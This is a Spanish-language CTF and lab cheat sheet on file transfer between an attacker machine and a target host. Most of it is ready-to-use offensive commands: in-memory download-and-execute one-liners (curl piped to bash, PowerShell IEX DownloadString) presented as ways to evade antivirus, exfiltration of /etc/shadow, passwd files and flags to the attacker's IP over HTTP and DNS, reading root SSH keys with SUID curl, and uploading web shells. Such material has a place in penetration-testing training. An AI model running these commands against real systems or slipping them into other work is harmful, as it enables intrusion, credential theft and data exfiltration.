# File Transfer — Guía de Referencia
### Transferencia de ficheros entre máquinas · CTF & lab

> 💡 En CTF el objetivo habitual es subir herramientas al objetivo (linpeas, winpeas, nc, socat…) o exfiltrar datos (flags, /etc/shadow, credenciales). Esta guía cubre ambos sentidos.

---

## Esquema general

```
Tu máquina (atacante)          Objetivo (víctima)
        |                            |
        |  ←── exfiltración ────────|  sacar datos del objetivo
        |  ──── subida ────────────→|  meter herramientas/payloads
```

---

## 01 · Servidores rápidos en tu máquina

Antes de transferir necesitas servir los ficheros desde tu máquina.

### HTTP

```bash
# Python3 — el más usado
python3 -m http.server 8080

# Python2
python -m SimpleHTTPServer 8080

# Con directorio específico
python3 -m http.server 8080 --directory /ruta/ficheros

# php — alternativa
php -S 0.0.0.0:8080
```

### FTP

```bash
# Python — pyftpdlib
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -w    # -w permite escritura (subida desde objetivo)
```

### SMB (útil para Windows)

```bash
# impacket-smbserver — sin autenticación
impacket-smbserver share /ruta/ficheros -smb2support

# Con autenticación
impacket-smbserver share /ruta/ficheros -smb2support -username user -password pass
```

**¿Por qué SMB?** — Windows puede acceder a shares SMB de forma nativa sin descargar nada. Útil cuando certutil y PowerShell están bloqueados.

### HTTPS con certificado autofirmado

```bash
# Generar certificado
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Servidor HTTPS con Python
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, keyfile='key.pem', certfile='cert.pem')
server.serve_forever()
"
```

---

## 02 · curl

### Descargar ficheros

```bash
# Descarga básica
curl http://<tu_ip>:8080/fichero -o /tmp/fichero

# Conservar el nombre original del fichero
curl http://<tu_ip>:8080/fichero -O

# Ignorar certificado SSL (HTTPS con cert autofirmado)
curl -k https://<tu_ip>/fichero -o /tmp/fichero

# Seguir redirecciones
curl -L http://<tu_ip>/fichero -o /tmp/fichero

# Con autenticación básica
curl -u usuario:password http://<tu_ip>/fichero -o /tmp/fichero

# Con header personalizado (token, API key…)
curl -H "Authorization: Bearer TOKEN" http://<tu_ip>/fichero -o /tmp/fichero

# Reanudar descarga interrumpida
curl -C - http://<tu_ip>/fichero -o /tmp/fichero
```

### Ejecutar en memoria — sin escribir en disco

```bash
# Ejecutar script directamente
curl http://<tu_ip>:8080/linpeas.sh | sh
curl http://<tu_ip>:8080/shell.sh | bash

# Descargar y ejecutar binario (necesita escribirse)
curl http://<tu_ip>:8080/socat -o /tmp/socat && chmod +x /tmp/socat && /tmp/socat ...
```

**¿Por qué en memoria?** — No deja rastro en disco. Útil para evadir antivirus o cuando no tienes permisos de escritura en el sistema de ficheros excepto en `/tmp`.

### Subir ficheros al objetivo desde tu máquina

```bash
# Subir via POST (formulario de upload web)
curl -X POST -F "file=@/tmp/shell.php" http://<ip>/upload.php

# Subir via PUT
curl -X PUT --data-binary @fichero.txt http://<ip>/ruta/fichero.txt

# Subir via FTP
curl -T fichero.txt ftp://<ip>/ --user usuario:password
```

### Exfiltrar datos hacia tu máquina

```bash
# Enviar contenido de fichero vía POST
curl -X POST -d "$(cat /etc/passwd)" http://<tu_ip>/recibir

# Enviar vía URL (base64 para evitar caracteres especiales)
curl http://<tu_ip>/$(cat /etc/shadow | base64 -w0)

# Exfiltrar vía DNS (out-of-band)
curl http://$(cat /etc/passwd | base64 | head -c 50).<tu_dominio>/

# Enviar fichero completo
curl -X POST -F "data=@/etc/shadow" http://<tu_ip>:8080/recibir
```

### Receptor para exfiltración en tu máquina

```bash
# Servidor Python que muestra lo recibido
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers['Content-Length'])
        print(self.rfile.read(l).decode())
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
```

### Leer ficheros del sistema (con SUID o sudo)

```bash
# Si curl tiene SUID o puede ejecutarse como root
curl file:///etc/shadow
curl file:///root/.ssh/id_rsa
curl file:///etc/sudoers
```

---

## 03 · wget

```bash
# Descarga básica
wget http://<tu_ip>:8080/fichero -O /tmp/fichero

# Conservar nombre original
wget http://<tu_ip>:8080/fichero

# En modo silencioso (sin output)
wget -q http://<tu_ip>:8080/fichero -O /tmp/fichero

# Ignorar certificado SSL
wget --no-check-certificate https://<tu_ip>/fichero -O /tmp/fichero

# Ejecutar en memoria
wget -O- http://<tu_ip>:8080/linpeas.sh | sh

# Descargar en background
wget -b http://<tu_ip>:8080/fichero -O /tmp/fichero

# Con autenticación básica
wget --user=usuario --password=pass http://<tu_ip>/fichero -O /tmp/fichero
```

**curl vs wget:**

| | `curl` | `wget` |
|---|---|---|
| Output por defecto | stdout | fichero |
| En memoria | `curl URL \| sh` | `wget -O- URL \| sh` |
| Subida de ficheros | Sí (`-F`, `-T`) | No nativamente |
| Reanudar descarga | `-C -` | `-c` |
| Recursivo | No | Sí (`-r`) |

---

## 04 · SCP — Linux a Linux

```bash
# Subir fichero al objetivo
scp /ruta/local/fichero usuario@<ip_objetivo>:/ruta/remota/

# Descargar fichero del objetivo
scp usuario@<ip_objetivo>:/ruta/remota/fichero /ruta/local/

# Directorio completo
scp -r /ruta/local/ usuario@<ip_objetivo>:/ruta/remota/

# Puerto SSH no estándar
scp -P 2222 fichero usuario@<ip>:/tmp/

# Con clave privada
scp -i id_rsa fichero usuario@<ip>:/tmp/
```

**¿Cuándo usarlo?** — Cuando tienes credenciales SSH válidas. Es el método más limpio y directo entre sistemas Linux.

---

## 05 · Netcat — transferencia sin autenticación

```bash
# En el receptor (escucha y guarda)
nc -lvnp 4444 > fichero_recibido

# En el emisor (envía)
nc <ip_receptor> 4444 < fichero_a_enviar

# Verificar integridad con md5
# En el emisor:
md5sum fichero_a_enviar
# En el receptor:
md5sum fichero_recibido
# Deben coincidir
```

**Transferir directorio comprimido:**

```bash
# Receptor
nc -lvnp 4444 | tar xzf -

# Emisor
tar czf - /directorio/ | nc <ip_receptor> 4444
```

**¿Por qué netcat?** — No requiere autenticación ni servicios adicionales. Útil cuando no hay SSH ni HTTP disponibles. Rápido y directo.

---

## 06 · Python — servidor y cliente

```bash
# Como cliente HTTP (alternativa a curl/wget)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<tu_ip>:8080/fichero', '/tmp/fichero')"

# One-liner más corto
python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<ip>:8080/f', '/tmp/f')"

# Python2
python -c "import urllib; urllib.urlretrieve('http://<ip>:8080/fichero', '/tmp/fichero')"

# Subir fichero vía POST con Python
python3 -c "
import requests
files = {'file': open('/etc/passwd','rb')}
requests.post('http://<tu_ip>:8080/upload', files=files)
"
```

---

## 07 · Windows — descarga

### certutil

```cmd
certutil -urlcache -f http://<tu_ip>:8080/fichero.exe C:\Temp\fichero.exe

# Decodificar base64 (certutil también sirve para esto)
certutil -decode fichero.b64 fichero.exe
```

**¿Por qué certutil?** — Está disponible en todas las versiones de Windows. No requiere PowerShell. Muy usado en CTFs porque siempre está presente.

### PowerShell — IWR / Invoke-WebRequest

```powershell
# Descarga básica
IWR http://<tu_ip>:8080/fichero -OutFile C:\Temp\fichero

# Invoke-WebRequest completo
Invoke-WebRequest -Uri http://<tu_ip>:8080/fichero -OutFile C:\Temp\fichero

# Ignorar errores SSL
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IWR https://<tu_ip>/fichero -OutFile C:\Temp\fichero

# Ejecutar en memoria (sin escribir en disco)
IEX (IWR http://<tu_ip>:8080/shell.ps1 -UseBasicParsing)
```

### PowerShell — WebClient

```powershell
# DownloadFile — más compatible con versiones antiguas
(New-Object Net.WebClient).DownloadFile('http://<tu_ip>:8080/fichero','C:\Temp\fichero')

# DownloadString — ejecutar en memoria
IEX (New-Object Net.WebClient).DownloadString('http://<tu_ip>:8080/shell.ps1')
```

**IEX en memoria** — Descarga y ejecuta el script PowerShell directamente sin escribirlo en disco. Muy usado para evadir antivirus.

### Bits Transfer (BITS)

```cmd
bitsadmin /transfer job /download /priority normal http://<tu_ip>:8080/fichero C:\Temp\fichero
```

**¿Por qué BITS?** — Es un servicio legítimo de Windows para descargas en background. Menos bloqueado que otros métodos y muy silencioso.

### SMB desde Windows

```cmd
# Acceder al share SMB de tu máquina
copy \\<tu_ip>\share\fichero C:\Temp\fichero

# Con credenciales
net use \\<tu_ip>\share /user:usuario password
copy \\<tu_ip>\share\fichero C:\Temp\
```

---

## 08 · Windows — subida y exfiltración

### PowerShell — subir fichero vía POST

```powershell
# Subir fichero a tu servidor
$uri = "http://<tu_ip>:8080/upload"
$fichero = "C:\Temp\datos.txt"
Invoke-RestMethod -Uri $uri -Method Post -InFile $fichero -ContentType "application/octet-stream"

# Subir contenido directamente
$datos = Get-Content C:\Temp\datos.txt -Raw
Invoke-WebRequest -Uri "http://<tu_ip>:8080/" -Method POST -Body $datos
```

### Exfiltrar via SMB (impacket)

```bash
# En tu máquina — levantar SMB con escritura habilitada
impacket-smbserver share /tmp/recibido -smb2support -username user -password pass
```

```cmd
# En Windows — copiar al share
net use \\<tu_ip>\share /user:user pass
copy C:\datos_sensibles.txt \\<tu_ip>\share\
```

---

## 09 · Base64 — cuando no hay herramientas

Cuando el objetivo no tiene curl, wget ni nc, se puede transferir cualquier fichero codificándolo en base64 y copiando el texto manualmente (o via shell).

### Linux → Linux

```bash
# En el origen — codificar
base64 fichero.bin

# Copiar el output y en el destino — decodificar
echo "BASE64STRING" | base64 -d > fichero.bin

# Verificar integridad
md5sum fichero.bin
```

### Linux → Windows

```bash
# En Linux — codificar
base64 -w0 fichero.exe
```

```powershell
# En Windows — decodificar
[System.Convert]::FromBase64String("BASE64STRING") | Set-Content -Path C:\Temp\fichero.exe -Encoding Byte
```

### Windows → Linux

```powershell
# En Windows — codificar
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\fichero.exe"))
```

```bash
# En Linux — decodificar
echo "BASE64STRING" | base64 -d > fichero.exe
```

**¿Cuándo usar base64?** — Cuando no hay ninguna herramienta de transferencia disponible pero tienes una shell interactiva. También útil para transferir binarios por canales que solo admiten texto (webshells, SQLi, etc.).

---

## 10 · Verificación de integridad

Después de transferir, siempre verificar que el fichero llegó íntegro — especialmente si es un binario o payload.

```bash
# Linux
md5sum fichero
sha256sum fichero

# Windows
certutil -hashfile C:\Temp\fichero MD5
certutil -hashfile C:\Temp\fichero SHA256

Get-FileHash C:\Temp\fichero -Algorithm MD5
Get-FileHash C:\Temp\fichero -Algorithm SHA256
```

---

## Referencia rápida por escenario

| Escenario | Método recomendado |
|---|---|
| Linux → Linux con SSH | `scp` |
| Linux → Linux sin SSH | `python3 -m http.server` + `curl/wget` |
| Linux → Windows | SMB (`impacket-smbserver`) o HTTP + `certutil` |
| Windows → Linux | SMB o PowerShell POST |
| Sin herramientas (solo shell) | Base64 manual |
| Ejecutar sin escribir en disco | `curl URL \| bash` / `IEX (IWR URL)` |
| Binarios grandes | `nc` con pipe o `scp` |
| Canal solo texto (webshell) | Base64 |
| Evadir antivirus | En memoria: `IEX DownloadString` / `curl \| bash` |

---

## Flujo habitual en CTF

```bash
# 1 — en tu máquina, servir las herramientas
python3 -m http.server 8080

# 2 — en el objetivo Linux, descargar
curl http://<tu_ip>:8080/linpeas.sh | sh
wget http://<tu_ip>:8080/socat -O /tmp/socat && chmod +x /tmp/socat

# 2 — en el objetivo Windows, descargar
certutil -urlcache -f http://<tu_ip>:8080/winPEASx64.exe C:\Temp\wp.exe
IEX (New-Object Net.WebClient).DownloadString('http://<tu_ip>:8080/shell.ps1')

# 3 — exfiltrar flag o datos
curl -X POST -d "$(cat /root/root.txt)" http://<tu_ip>:8080/
```

---

*File Transfer Reference — uso exclusivo en entornos autorizados · CTF / laboratorio*
